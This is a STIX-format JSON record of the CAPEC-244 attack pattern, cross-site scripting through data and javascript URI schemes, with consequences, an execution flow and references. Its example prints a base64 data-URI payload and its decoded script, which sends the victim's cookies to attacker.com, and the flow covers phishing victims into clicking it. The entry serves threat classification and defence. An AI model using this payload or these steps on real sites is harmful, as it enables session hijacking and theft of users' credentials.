{
    "id": "bundle--5c1d56d0-c76e-4e20-9bfd-bb64167d1265",
    "objects": [
        {
            "created": "2014-06-23T00:00:00.000Z",
            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
            "description": "An attack of this type exploits the ability of most browsers to interpret \"data\", \"javascript\" or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.",
            "external_references": [
                {
                    "external_id": "CAPEC-244",
                    "source_name": "capec",
                    "url": "https://capec.mitre.org/data/definitions/244.html"
                },
                {
                    "external_id": "CWE-83",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/83.html"
                },
                {
                    "description": "OWASP Testing Guide (v2), The Open Web Application Security Project (OWASP)",
                    "external_id": "REF-70",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.owasp.org/index.php/Testing_for_Cross_site_scripting"
                },
                {
                    "description": "Google Cross-Site Scripting HOWTO article, Google",
                    "external_id": "REF-96",
                    "source_name": "reference_from_CAPEC",
                    "url": "https://code.google.com/archive/p/doctype/wikis/ArticleXSSInUrlAttributes.wiki"
                },
                {
                    "description": "WASC Threat Classification 2.0, 2010, The Web Application Security Consortium (WASC)",
                    "external_id": "REF-72",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://projects.webappsec.org/Cross-Site+Scripting"
                }
            ],
            "id": "attack-pattern--c77ec906-0371-482e-8b14-a4a41b6b5b74",
            "modified": "2022-09-29T00:00:00.000Z",
            "name": "XSS Targeting URI Placeholders",
            "object_marking_refs": [
                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
            ],
            "type": "attack-pattern",
            "x_capec_abstraction": "Detailed",
            "x_capec_child_of_refs": [
                "attack-pattern--61b17787-fe92-427c-9e6a-6311997d7b2a",
                "attack-pattern--800f8095-99b6-4bb9-8bc6-8b9727201a2f",
                "attack-pattern--b1eef783-daae-494c-a418-cd9ada7cbe8b"
            ],
            "x_capec_consequences": {
                "Access_Control": [
                    "Bypass Protection Mechanism"
                ],
                "Accountability": [
                    "Gain Privileges"
                ],
                "Authentication": [
                    "Gain Privileges"
                ],
                "Authorization": [
                    "Execute Unauthorized Commands (Run Arbitrary Code)",
                    "Gain Privileges",
                    "Bypass Protection Mechanism"
                ],
                "Confidentiality": [
                    "Read Data"
                ],
                "Integrity": [
                    "Modify Data"
                ],
                "Non-Repudiation": [
                    "Gain Privileges"
                ]
            },
            "x_capec_domains": [
                "Software",
                "Software",
                "Software"
            ],
            "x_capec_example_instances": [
                "\n               <xhtml:p>The following payload data:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\">text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==</xhtml:div>\n               <xhtml:p>represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser.</xhtml:p>\n               <xhtml:p>The decoded payload is the following piece of HTML code:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\"><html><xhtml:div style=\"margin-left:1em;\"><body><xhtml:div style=\"margin-left:1em;\"><script><xhtml:div style=\"margin-left:1em;\">var img = new Image();img.src = \"http://attacker.com/cookiegrabber?\"+ encodeURIComponent(document.cookies);</xhtml:div>\n                        </script></xhtml:div>\n                     </body></xhtml:div>\n                  </html></xhtml:div>\n               <xhtml:p>Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack.</xhtml:p>\n               <xhtml:p>An adversary could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute):</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\"><a href=\"INJECTION_POINT\">My Link</a></xhtml:div>\n               <xhtml:p>Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.</xhtml:p>\n            "
            ],
            "x_capec_execution_flow": "<h2> Execution Flow </h2><div><h3>Explore</h3><ol><li> <p> <b>Survey the application for user-controllable inputs: </b>Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</td></tr><tr><td>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</td></tr><tr><td>Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</td></tr></tbody></table></ol></div><div><h3>Experiment</h3><ol><li> <p> <b>Probe identified potential entry points for reflected XSS vulnerability: </b>The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various payloads formatted as data URI schemes using base to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.</td></tr><tr><td>Use a proxy tool to record results of manual input of XSS probes in known URLs.</td></tr></tbody></table><li> <p> <b>Craft malicious XSS URL: </b>Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Change a URL parameter to include a malicious payload formatted as a URI scheme, or use the URL returned when the URI scheme was given as input to the web application.</td></tr><tr><td>Send information gathered from the malicious script to a remote endpoint.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>Get victim to click URL: </b>In order for the attack to be successful, the victim needs to access the malicious URL.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.</td></tr><tr><td>Put the malicious URL on a public forum, where many victims might accidentally click the link.</td></tr></tbody></table></ol></div>",
            "x_capec_likelihood_of_attack": "High",
            "x_capec_prerequisites": [
                "Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme."
            ],
            "x_capec_resources_required": [
                "Ability to send HTTP request to a web application"
            ],
            "x_capec_skills_required": {
                "Medium": "To inject the malicious payload in a web page"
            },
            "x_capec_status": "Draft",
            "x_capec_typical_severity": "High",
            "x_capec_version": "3.9"
        }
    ],
    "spec_version": "2.0",
    "type": "bundle"
}